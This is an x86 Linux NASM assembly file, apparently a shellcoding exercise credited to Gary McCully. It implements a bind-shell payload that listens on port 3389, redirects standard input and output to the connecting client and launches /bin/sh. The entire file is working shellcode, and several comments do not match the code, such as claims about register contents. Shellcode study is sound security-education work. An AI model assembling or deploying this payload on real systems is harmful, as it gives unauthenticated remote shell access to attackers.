;Special Thanks to the following:
; Gray Hat Hacking (4th Edition)
; https://www.whitehatters.academy/assembly-language-and-shellcoding-on-linux-part-2/
; http://www.rcesecurity.com
; Hacking the Art of Exploitation (2nd Edition)


; Filename: BindShell.nasm
; Author:  Gary McCully
;
;
; Purpose: Create a Bind Shell 


global _start			

section .text
_start:


;*********Socket**********
; int socketcall(int call, unsigned long *args);
; socket(int socket_family, int socket_type, int protocol)
; socket(2,1,0) - Build an IP Socket

; Prep work
	xor eax, eax        ;Zero out eax  
	xor ebx, ebx        ;Zero out ebx
	xor esi, esi

; Push socket arguments on the stack in reverse order
	push eax            ;protocol=0x0
	push byte 0x1       ;socket_type=0x1
	push byte 0x2       ;socket_family=0x2
	mov ecx, esp        ;Set ecx to the address of our args  

; Setup and call socket with SYS_SOCKET argument
	mov byte bl, 0x1    ;sys_socket(0x1)	
	mov byte al, 0x66   ;socket system call (102) 
	int 0x80            ;Make the syscall  


;*********Bind**********
; int socketcall(int call, unsigned long *args);
; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
; bind(sockfd, struct sockaddr *) &serv_addr,0x10) - Bind to a local system on specified port

; Prep work
	mov esi, eax        ; Save sockfd returned on eax into edx
    	xor eax, eax        ; Zero out eax

;Setup struct sockaddr {sa_family_t sa_family; char sa_data[14];}
	push edx            ; Command used to terminate the next value pushed (edx equals 0)
    	push word 0x3d0d    ; sin_port=3389 
    	push word 0x2       ; AF_INET(0x2)   	
	mov ecx, esp        ; Save the esp address into ecx

; Push bind arguments on the stack in reverse order 
    	push 0x10           ; push 16 onto the stack
    	push ecx            ; push struct sockaddr address onto the stack (stored in ecx)
    	push esi            ; Value of sockfd
    	mov ecx, esp        ;Set ecx to the address of our args 

; Setup and call socket with SYS_BIND argument
	mov bl, 0x2         ; bind(0x2)
	mov al, 0x66        ; socket system call (102)
    	int 0x80            ; Make the syscall

;*********Listen**********
; int socketcall(int call, unsigned long *args);
; int listen(int sockfd, int backlog);
; listen(sockfd, 0) - Listen for connections
	
; Prep work
	push edx            ; Command used to terminate the next value pushed (edx equals 0)

; Push listen arguments on the stack in reverse order
	push edx            ; backlog=0 (edx equals 0)        
	push esi            ; Push the address of sockfd onto the stack 
	mov ecx, esp        ; Set ecx to the address of our args 	

; Setup and call socket with SYS_LISTEN argument 
	mov bl, 0x4         ; Set ebx to 4 (Listen)  
	mov al, 0x66        ; socket system call (102)
	 
	int 0x80            ; Make the syscall

;*********Accept**********
; int socketcall(int call, unsigned long *args);
; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
; accept(sockfd, 0, 0) - Accept a connection

; Prep work
	push edx            ; Command used to terminate the next value pushed (edx equals 0)

; Push accept arguments on the stack in reverse order
	push eax             ; socklen_t=0 
	push eax             ; sockaddr=0
	push esi             ; Push pointer to sockfd onto the stack  
	mov ecx, esp         ; Set ecx to the address of our args  	

; Setup and call socket with SYS_ACCEPT argument 
	mov bl, 0x5          ; Set ebx to 5 (accept)  
	mov al, 0x66         ; socket system call (102) 
	int 0x80             ; Make the syscall 

;*********Proxy STDIN/STDOUT/STDERR through the connection**********
; int dup2(int oldfd, int newfd);
; dup2(client, 0) -Setup standard input (stdin), standard output (stdout) and standard error (stderr)   
 
; Setup and call dup2 with standard input (stdin) argument 		
	xor ecx, ecx        ; newfd=0 (stdin)	
	mov ebx, eax        ; Set ebx to the ret val of accept (i.e. client connection)
	mov al, 0x3f        ; Set eax to 63 (syscall number for dup2)
    	int 0x80            ; Make the syscall

; Setup and call dup2 with standard output (stdout) argument 		
	mov cl, 0x1         ; newfd=1 (stdout)	
	mov al, 0x3f        ; Set eax to 63 (syscall number for dup2)
    	int 0x80            ; Make the syscall

; Setup and call dup2 with standard error (stderr) argument 		
	mov cl, 0x2         ; newfd=2 (stderr)	
	mov al, 0x3f        ; Set eax to 63 (syscall number for dup2)
    	int 0x80            ; Make the syscall

;*********Run /bin/sh using execve**********
; int execve(const char *filename, char *const argv[],char *const envp[]);
; execve(/bin/bash,/bin/bash 0, 0)

; Prep work
	xor eax, eax       ; Zero out eax
	
;Setup argv & filename
	push eax           ; Command used to terminate the next value pushed (eax equals 0)
	push 0x68732f2f    ; PUSH //bin/sh - PT1
	push 0x6e69622f    ; PUSH //bin/sh - PT2
	mov ebx, esp       ; Save the esp address into ecx

; Setup and call execve in order to start /bin/sh
	push eax           ; Push a 0 on the stack
	mov edx, esp       ; envp[]=Stack address pointing to zero
	push ebx           ; push stack address of argv[] onto the stack
	mov ecx, esp       ; argv = address of filename followed by 0
	mov al, 0xb         ; Set eax to 11 (syscall number for execve)  
	int 0x80      
